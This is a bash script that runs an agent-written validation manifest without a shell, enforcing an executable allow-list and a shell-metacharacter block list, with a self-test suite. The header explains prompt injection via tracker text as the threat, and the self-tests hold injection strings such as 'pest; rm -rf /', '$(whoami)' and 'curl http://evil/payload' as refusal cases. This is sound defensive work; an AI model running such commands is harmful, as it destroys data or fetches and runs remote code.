#!/usr/bin/env bash
# run-validation.sh — execute a validation manifest deterministically and report
# the result as machine-readable JSON.
#
# Why this exists
#   Validating a change is deterministic work: run the tests covering the diff,
#   run static analysis, run the linters, read the exit codes. The pipeline used
#   to spend a whole agent session on it — a second model dispatch whose entire
#   job was to decide which commands to run and then run them. On a small change
#   that session cost more than the change did.
#
#   The implementer already knows which commands cover its own diff, so it
#   writes them into a manifest as part of its handoff, and this script runs
#   them. An LLM is then an escalation path — for a failure that needs
#   interpreting or a manifest that cannot be trusted — rather than the default
#   mechanism for running four commands.
#
# Usage
#   run-validation.sh --manifest <path|-> [--logs <dir>] [--dry-run]
#   run-validation.sh --self-test
#
#   --manifest  the validation manifest, JSON (`-` reads stdin)
#   --logs      directory for per-category logs (default: alongside the manifest
#               in `logs/`); each category writes `<logs>/<category>.log`
#   --dry-run   validate the manifest and print the plan without executing it
#
# Manifest
#   {
#     "head_sha": "abc123",
#     "tests":           ["vendor/bin/pest tests/Feature/CreateOrderTest.php"],
#     "static_analysis": ["vendor/bin/phpstan analyse app/Actions/CreateOrder.php"],
#     "lint":            ["vendor/bin/pint --test"]
#   }
#
#   `head_sha` is required and must be the commit the manifest describes. Every
#   category is optional, but a manifest with no command in any category is
#   invalid: "nothing to run" is indistinguishable from "the implementer could
#   not work out what to run", and the second must escalate rather than pass.
#
# Output (stdout, JSON)
#   {
#     "status": "passed" | "failed" | "invalid",
#     "head_sha": "abc123",
#     "checks": { "tests": "passed", "static_analysis": "passed", "lint": "skipped" },
#     "failures": [ { "category": "tests", "command": "…", "exit_code": 1, "log": "logs/tests.log" } ],
#     "escalate": true | false,
#     "escalation_reason": "…"
#   }
#
#   `escalate` is the whole point of the contract: this script decides whether a
#   model is needed, and says so in the same document that carries the result.
#
# SECURITY — why the manifest is not a shell script
#   A manifest is written by an agent whose context includes tracker text anyone
#   can write (@rules/security/general.md *Untrusted Content Boundary*). If this
#   script passed its commands to a shell, a prompt injection that reached the
#   manifest would be arbitrary code execution on the developer's machine, run
#   by a step whose whole selling point is that no human reviews it.
#
#   Three defences, all mandatory:
#     1. No shell. Every command is split on whitespace into an argv array and
#        executed directly. There is no `eval`, no `sh -c`, and no command
#        substitution — so `;`, `|`, `&&`, `$(…)`, and backticks are not
#        operators here, they are characters in an argument.
#     2. A character allow-list rejects the manifest outright when a command
#        contains any of them anyway. Defence 1 already makes them inert; this
#        turns "inert" into "refused", so a manifest that tries is visible
#        rather than merely harmless.
#     3. An executable allow-list: the first token must name one of the
#        project-local tools below. `curl`, `rm`, `git`, and everything else the
#        list does not carry is refused, whatever it is passed.
#   A refusal is `status: invalid` with `escalate: true` — never a silent skip,
#   and never a pass.
#
# Exit codes
#   0  every executed check passed
#   1  usage error
#   2  missing required tool (jq)
#   3  the manifest is invalid or refused — escalate, do not treat as a pass
#   4  a check failed — escalate for interpretation
set -euo pipefail

PROG="${0##*/}"

usage() {
  cat >&2 <<'EOF'
Usage: run-validation.sh --manifest <path|-> [--logs <dir>] [--dry-run]
       run-validation.sh --self-test

Runs a validation manifest and prints a JSON result. Exit 0 pass, 3 invalid,
4 failed. Commands are executed without a shell and must name an allow-listed
project-local tool.
EOF
}

# The categories a manifest may carry, in execution order: cheapest signal that
# localises a problem first, so a broken lint does not wait behind a suite.
CATEGORIES=(lint static_analysis tests)

# Executables a manifest may name. Everything here is a project-local developer
# tool that a validation step legitimately runs. Anything that writes outside
# the project, talks to the network, or manipulates history is deliberately
# absent — this list is the difference between "runs the project's checks" and
# "runs whatever it was told to".
ALLOWED_EXECUTABLES=(
  vendor/bin/pest
  vendor/bin/phpunit
  vendor/bin/phpstan
  vendor/bin/psalm
  vendor/bin/pint
  vendor/bin/phpcs
  vendor/bin/php-cs-fixer
  vendor/bin/rector
  vendor/bin/phpcbf
  composer
  php
  artisan
  npm
  npx
  yarn
  pnpm
  make
)

# Characters that have meaning to a shell. This script never invokes one, so
# these are already inert — the check exists so a manifest that carries them is
# refused loudly instead of running with them as literal argument text.
SHELL_METACHARACTERS=';|&$`(){}<>*?!#'

safe_display() {
  printf '%s' "$1" | LC_ALL=C tr -cd '[:print:]' | cut -c1-200
}

json_string() {
  # Escape for a JSON string literal without depending on jq being able to read
  # the value first — this runs on refusal paths where jq already declined.
  printf '%s' "$1" | LC_ALL=C sed -e 's/\\/\\\\/g' -e 's/"/\\"/g' -e 's/\t/\\t/g' | tr -d '\n\r'
}

# Emit the result document and exit. Every exit path below goes through here, so
# the caller always receives one parseable document, including on a refusal.
emit() {
  local status="$1" escalate="$2" reason="$3"
  local first=1 category entry

  printf '{\n'
  printf '  "status": "%s",\n' "$status"
  printf '  "head_sha": "%s",\n' "$(json_string "${HEAD_SHA:-}")"
  printf '  "checks": {'
  for category in "${CATEGORIES[@]}"; do
    [[ "$first" -eq 1 ]] || printf ','
    first=0
    printf '\n    "%s": "%s"' "$category" "$(check_state "$category")"
  done
  printf '\n  },\n'
  printf '  "failures": ['
  first=1
  for entry in ${FAILURES[@]+"${FAILURES[@]}"}; do
    [[ "$first" -eq 1 ]] || printf ','
    first=0
    printf '\n    %s' "$entry"
  done
  [[ "$first" -eq 1 ]] || printf '\n  '
  printf '],\n'
  printf '  "escalate": %s,\n' "$escalate"
  printf '  "escalation_reason": "%s"\n' "$(json_string "$reason")"
  printf '}\n'
}

check_state() {
  local name="$1" var
  var="STATE_${name}"
  printf '%s' "${!var:-skipped}"
}

refuse() {
  local reason="$1"
  emit invalid true "$reason"
  exit 3
}

# Validate one command string and echo its argv, one token per line.
#
# Returns 1 with a reason on stderr when the command is refused. The caller
# turns that into a refusal of the whole manifest: a manifest carrying one
# unacceptable command is not partially trustworthy.
validate_command() {
  local command="$1" token executable allowed found=0

  [[ -n "$command" ]] || { echo 'empty command' >&2; return 1; }

  case "$command" in
  *$'\n'* | *$'\r'*) echo 'command contains a newline' >&2; return 1 ;;
  esac

  # A quote would only matter to a shell; this script splits on whitespace, so a
  # quoted argument would silently become two. Refuse rather than mis-split.
  case "$command" in
  *\'* | *\"* | *\\*) echo 'command contains a quote or backslash' >&2; return 1 ;;
  esac

  local index char
  for ((index = 0; index < ${#SHELL_METACHARACTERS}; index++)); do
    char="${SHELL_METACHARACTERS:index:1}"
    case "$command" in
    *"$char"*)
      echo "command contains the shell metacharacter '$char'" >&2
      return 1
      ;;
    esac
  done

  # No leading `-`: a first token that looks like an option means the manifest
  # is malformed, and passing it on would let it be read as an option by
  # whatever ran next.
  read -r executable _ <<<"$command"
  case "$executable" in
  -*) echo 'command starts with an option' >&2; return 1 ;;
  esac

  # Path traversal in the executable, in the one spelling that escapes the
  # project: a relative segment climbing out of it.
  case "$executable" in
  */../* | ../* | /*) echo 'executable is an absolute path or climbs out of the project' >&2; return 1 ;;
  esac

  executable="${executable#./}"

  for allowed in "${ALLOWED_EXECUTABLES[@]}"; do
    if [[ "$executable" == "$allowed" ]]; then
      found=1
      break
    fi
  done

  if [[ "$found" -ne 1 ]]; then
    echo "executable is not allow-listed: $(safe_display "$executable")" >&2
    return 1
  fi

  # Intentional word splitting: the command has been proven to carry no quote,
  # no backslash, and no metacharacter, so whitespace is the only separator.
  # shellcheck disable=SC2086
  printf '%s\n' $command
  return 0
}

run_manifest() {
  local manifest_arg="" logs_dir="" dry_run=0

  while [[ $# -gt 0 ]]; do
    case "$1" in
    --manifest)
      [[ $# -ge 2 ]] || { usage; return 1; }
      manifest_arg="$2"
      shift 2
      ;;
    --logs)
      [[ $# -ge 2 ]] || { usage; return 1; }
      logs_dir="$2"
      shift 2
      ;;
    --dry-run)
      dry_run=1
      shift
      ;;
    *)
      echo "$PROG: unknown argument: $(safe_display "$1")" >&2
      usage
      return 1
      ;;
    esac
  done

  [[ -n "$manifest_arg" ]] || { usage; return 1; }

  local manifest
  if [[ "$manifest_arg" == "-" ]]; then
    manifest="$(cat)"
  elif [[ -r "$manifest_arg" ]]; then
    manifest="$(cat -- "$manifest_arg")"
  else
    echo "$PROG: cannot read manifest: $(safe_display "$manifest_arg")" >&2
    return 1
  fi

  FAILURES=()
  HEAD_SHA=""

  if ! printf '%s' "$manifest" | jq -e . >/dev/null 2>&1; then
    refuse 'manifest is not valid JSON'
  fi

  HEAD_SHA="$(printf '%s' "$manifest" | jq -r '.head_sha // ""')"
  if [[ ! "$HEAD_SHA" =~ ^[0-9a-f]{7,40}$ ]]; then
    refuse 'manifest carries no valid head_sha'
  fi

  if [[ -z "$logs_dir" ]]; then
    if [[ "$manifest_arg" == "-" ]]; then
      logs_dir="logs"
    else
      logs_dir="$(dirname -- "$manifest_arg")/logs"
    fi
  fi

  # --- Validate every command before running any of them ---------------------
  #
  # All-or-nothing on purpose: a manifest whose third command is refused must
  # not have already run the first two. Half-executed validation is the state
  # nobody can act on.
  local category command reason total=0
  local -a plan=()
  for category in "${CATEGORIES[@]}"; do
    while IFS= read -r command; do
      [[ -n "$command" ]] || continue
      total=$((total + 1))
      if ! reason="$(validate_command "$command" 2>&1 >/dev/null)"; then
        refuse "$category: $(safe_display "$reason") — $(safe_display "$command")"
      fi
      plan+=("$category|$command")
    done < <(printf '%s' "$manifest" | jq -r --arg c "$category" '.[$c] // [] | .[]')
  done

  if [[ "$total" -eq 0 ]]; then
    refuse 'manifest carries no commands — validation scope could not be determined'
  fi

  if [[ "$dry_run" -eq 1 ]]; then
    local item
    for item in "${plan[@]}"; do
      printf '%s\n' "$item" >&2
    done
    emit passed false 'dry run — nothing was executed'
    return 0
  fi

  mkdir -p -- "$logs_dir"

  # --- Execute ---------------------------------------------------------------
  local failed=0 item log status
  for category in "${CATEGORIES[@]}"; do
    log="$logs_dir/$category.log"
    for item in "${plan[@]}"; do
      [[ "${item%%|*}" == "$category" ]] || continue
      command="${item#*|}"

      local -a argv=()
      while IFS= read -r token; do
        argv+=("$token")
      done < <(validate_command "$command")

      set +e
      "${argv[@]}" >>"$log" 2>&1
      status=$?
      set -e

      if [[ "$status" -ne 0 ]]; then
        failed=1
        printf -v STATE_"$category" '%s' failed
        FAILURES+=("{ \"category\": \"$category\", \"command\": \"$(json_string "$command")\", \"exit_code\": $status, \"log\": \"$(json_string "$log")\" }")
      elif [[ "$(check_state "$category")" != "failed" ]]; then
        printf -v STATE_"$category" '%s' passed
      fi
    done
  done

  if [[ "$failed" -eq 1 ]]; then
    emit failed true 'a validation command failed — the failure needs interpretation'
    return 4
  fi

  emit passed false ''
  return 0
}

SELF_TEST_TMP=""
# Reached only through `trap cleanup_self_test EXIT`; ShellCheck does not credit a trap as an
# invocation (SC2317, and SC2329 in 0.11), so both are suppressed.
# shellcheck disable=SC2317,SC2329
cleanup_self_test() {
  [[ -n "$SELF_TEST_TMP" ]] && rm -rf "$SELF_TEST_TMP"
  return 0
}

self_test() {
  local failures=0 script
  script="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/$PROG"
  SELF_TEST_TMP="$(mktemp -d)"
  trap cleanup_self_test EXIT
  local tmp="$SELF_TEST_TMP"

  # A fake project tree: `vendor/bin/pest` is a stub whose exit code the test
  # controls, so the runner's contract is exercised without a real suite.
  mkdir -p "$tmp/project/vendor/bin"
  cat >"$tmp/project/vendor/bin/pest" <<'STUB'
#!/usr/bin/env bash
# Exits 0 unless asked for a failure, so one stub covers both paths.
[[ "${1:-}" == "--fail" ]] && { echo "1 failed"; exit 1; }
echo "ok"
STUB
  cat >"$tmp/project/vendor/bin/pint" <<'STUB'
#!/usr/bin/env bash
echo "style ok"
STUB
  chmod +x "$tmp/project/vendor/bin/pest" "$tmp/project/vendor/bin/pint"

  # Assert the exit code AND the reported status — a runner that exits 0 while
  # reporting "failed" is worse than one that only gets the code wrong.
  #
  # The manifest arrives as ONE argument and this function writes it. An earlier
  # version nested `"$(writemanifest "…")"` inside the argument list, and bash
  # 3.2 re-parsed the outer quoting whenever the inner JSON interpolated a
  # variable carrying quotes — the substitution expanded twice and every
  # assertion compared a file path against an exit code.
  verdict() {
    local label="$1" json="$2" expected_exit="$3" expected_status="$4" expected_escalate="${5:-}"
    local manifest="$tmp/manifest-$RANDOM$RANDOM.json"
    printf '%s' "$json" >"$manifest"

    local out actual status escalate
    set +e
    out="$(cd "$tmp/project" && "$script" --manifest "$manifest" --logs "${VERDICT_LOGS:-$tmp/logs}" 2>/dev/null)"
    actual=$?
    set -e
    status="$(printf '%s' "$out" | jq -r '.status // "none"' 2>/dev/null || printf 'unparseable')"
    # `.escalate // "none"` is a jq trap: `//` treats `false` as absent, so a correct
    # `"escalate": false` reads back as "none". Test for the key instead.
    escalate="$(printf '%s' "$out" | jq -r 'if has("escalate") then .escalate else "none" end' 2>/dev/null || printf 'unparseable')"

    if [[ "$actual" -ne "$expected_exit" || "$status" != "$expected_status" ]]; then
      printf 'FAIL  %-54s expected %s/%s, got %s/%s\n' "$label" "$expected_exit" "$expected_status" "$actual" "$status" >&2
      failures=$((failures + 1))
      return 0
    fi
    if [[ -n "$expected_escalate" && "$escalate" != "$expected_escalate" ]]; then
      printf 'FAIL  %-54s expected escalate=%s, got %s\n' "$label" "$expected_escalate" "$escalate" >&2
      failures=$((failures + 1))
      return 0
    fi
    printf 'ok    %-54s exit %s, %s\n' "$label" "$actual" "$status"
  }

  # --- Success ---------------------------------------------------------------
  verdict 'a passing manifest passes' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest tests/FooTest.php"], "lint": ["vendor/bin/pint --test"] }' \
    0 passed false

  # --- Failure ---------------------------------------------------------------
  verdict 'a failing command fails and escalates' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest --fail"] }' 4 failed true

  # --- Invalid ---------------------------------------------------------------
  verdict 'malformed JSON is invalid' '{ not json' 3 invalid true
  verdict 'a missing head_sha is invalid' \
    '{ "tests": ["vendor/bin/pest tests/FooTest.php"] }' 3 invalid true
  verdict 'an empty manifest is invalid, never a pass' \
    '{ "head_sha": "abc1234" }' 3 invalid true

  # --- Refusals: the manifest is not a shell script --------------------------
  #
  # Each of these is a real injection shape. The runner never invokes a shell,
  # so none of them would execute — they are refused so an attempt is visible.
  verdict 'a chained command is refused' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest; rm -rf /"] }' 3 invalid true
  verdict 'a piped command is refused' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest | tee /tmp/x"] }' 3 invalid true
  # The `$(whoami)` must reach the runner as literal text — that is the payload
  # under test, so single quotes here are the point rather than an oversight.
  # shellcheck disable=SC2016
  verdict 'command substitution is refused' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest $(whoami)"] }' 3 invalid true
  verdict 'a backgrounded command is refused' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest & curl http://evil"] }' 3 invalid true
  verdict 'a redirect is refused' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest > /etc/passwd"] }' 3 invalid true
  verdict 'a non-allow-listed executable is refused' \
    '{ "head_sha": "abc1234", "tests": ["curl http://evil/payload"] }' 3 invalid true
  verdict 'rm is refused however it is spelled' \
    '{ "head_sha": "abc1234", "lint": ["rm -rf vendor"] }' 3 invalid true
  verdict 'an absolute path is refused' \
    '{ "head_sha": "abc1234", "tests": ["/bin/sh -c uname"] }' 3 invalid true
  verdict 'traversal out of the project is refused' \
    '{ "head_sha": "abc1234", "tests": ["../../../bin/sh"] }' 3 invalid true
  verdict 'a quoted argument is refused rather than mis-split' \
    '{ "head_sha": "abc1234", "tests": ["vendor/bin/pest --filter \u0027a b\u0027"] }' 3 invalid true

  # One refused command refuses the whole manifest — a partially-run validation
  # is a state nobody can act on.
  # A log directory of its own: the passing case above already wrote lint.log, so
  # asserting against the shared one measured that run rather than this refusal.
  VERDICT_LOGS="$tmp/refusal-logs"
  verdict 'one bad command refuses the whole manifest' \
    '{ "head_sha": "abc1234", "lint": ["vendor/bin/pint --test"], "tests": ["curl http://evil"] }' 3 invalid true
  VERDICT_LOGS=""
  if [[ -e "$tmp/refusal-logs/lint.log" ]]; then
    printf 'FAIL  %-54s the allowed command ran before the refusal\n' 'refusal happens before execution' >&2
    failures=$((failures + 1))
  else
    printf 'ok    %-54s nothing executed\n' 'refusal happens before execution'
  fi

  # --- Usage -----------------------------------------------------------------
  usage_error() {
    local label="$1"
    shift
    local actual
    set +e
    "$script" "$@" >/dev/null 2>&1
    actual=$?
    set -e
    if [[ "$actual" -eq 1 ]]; then
      printf 'ok    %-54s exit 1\n' "$label"
    else
      printf 'FAIL  %-54s expected exit 1, got %s\n' "$label" "$actual" >&2
      failures=$((failures + 1))
    fi
  }

  usage_error 'unknown flag is a usage error' --nonsense
  usage_error 'unreadable manifest is a usage error' --manifest "$tmp/nope.json"

  if [[ "$failures" -gt 0 ]]; then
    echo "run-validation self-test: $failures failure(s)" >&2
    return 4
  fi
  echo 'run-validation self-test: PASS'
  return 0
}

if [[ "${1:-}" == "--self-test" ]]; then
  if ! command -v jq >/dev/null 2>&1; then
    echo "$PROG: required tool not found: jq" >&2
    exit 2
  fi
  self_test
  exit $?
fi

if ! command -v jq >/dev/null 2>&1; then
  echo "$PROG: required tool not found: jq" >&2
  exit 2
fi

run_manifest "$@"
